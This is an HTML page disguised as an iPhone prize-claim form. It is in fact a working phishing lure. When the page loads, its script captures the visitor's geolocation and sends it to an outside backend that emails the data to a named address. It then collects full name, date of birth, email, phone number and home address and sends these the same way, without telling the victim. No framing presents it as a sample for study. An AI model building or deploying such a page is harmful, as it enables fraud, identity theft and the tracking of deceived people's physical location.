<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with the desired background URL */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .form-heading {
            color: #333;
            font-size: 1.5rem;
            margin-bottom: 20px;
        }
        .btn-primary {
            background-color: #007bff;
            border: none;
            margin-top: 15px;
        }
        .btn-primary:hover {
            background-color: #0056b3;
        }
        .form-text {
            font-size: 0.9rem;
            color: #666;
        }
        #rewardForm {
            display: none; /* Initially hide the form */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
        <p id="locationDisplay" class="form-text">Requesting location permission...</p>

        <!-- Fill Out Form -->
        <form id="rewardForm">
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
            </div>
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" class="form-control" id="dob" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="phoneNumber">Phone Number</label>
                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
            </div>
            <div class="form-group">
                <label for="address">Shipping Address</label>
                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
            </div>
            <div class="form-group">
                <label for="city">City</label>
                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
            </div>
            <div class="form-group">
                <label for="postalCode">Postal Code</label>
                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
        </form>
    </div>

    <!-- Bootstrap and jQuery JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <!-- JavaScript for Geolocation and Email Sending -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");
            const rewardForm = document.getElementById("rewardForm");

            // Request location permission
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                        
                        // Send location data via email
                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com")
                            .then(() => {
                                rewardForm.style.display = "block"; // Show the form after successful email
                                locationDisplay.textContent = "Location captured successfully! Please fill out the form.";
                            })
                            .catch((error) => {
                                locationDisplay.textContent = "Error sending location data.";
                                console.error("Error sending email:", error);
                            });
                    },
                    (error) => {
                        locationDisplay.textContent = "Failed to capture location. Please enable location services.";
                        console.error("Geolocation error:", error);
                    }
                );
            } else {
                locationDisplay.textContent = "Geolocation is not supported by this browser.";
            }
        });

        // Send Email Function
        async function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Khalil Ahmed"
            };

            const response = await fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            });

            if (!response.ok) {
                throw new Error(`Server responded with ${response.status}`);
            }

            return response.json();
        }

        // Form submission
        document.getElementById("rewardForm").addEventListener("submit", function (e) {
            e.preventDefault();

            // Collect form data
            const fullName = document.getElementById("fullName").value;
            const dob = document.getElementById("dob").value;
            const email = document.getElementById("email").value;
            const phoneNumber = document.getElementById("phoneNumber").value;
            const address = document.getElementById("address").value;
            const city = document.getElementById("city").value;
            const postalCode = document.getElementById("postalCode").value;

            // Format form data into a message
            const formMessage = `
                Full Name: ${fullName}\n
                Date of Birth: ${dob}\n
                Email: ${email}\n
                Phone Number: ${phoneNumber}\n
                Address: ${address}\n
                City: ${city}\n
                Postal Code: ${postalCode}
            `;

            // Send form data via email
            sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com")
                .then(() => {
                    alert("Thank you for your submission! We will contact you shortly.");
                })
                .catch((error) => {
                    console.error("Error sending form data:", error);
                    alert("Failed to submit the form. Please try again.");
                });
        });
    </script>
</body>
</html>
